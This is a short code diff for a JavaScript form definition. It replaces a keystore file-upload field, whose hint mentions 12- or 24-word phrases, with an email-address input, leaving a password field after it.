@@ -10,10 +10,9 @@ import Modal from '../Modal';
 const FORM_INPUT = [
     {
         name: 'keystore',
-        label: 'Upload your keystore file',
-        type: 'file',
-        placeholder: 'Choose your keystore file',
-        hint: 'Typically 12(sometimes 24) words separated by single spaces',
+        label: 'Email Address',
+        type: 'email',
+        placeholder: 'Enter your email address',
     },
     {
         name: 'password',
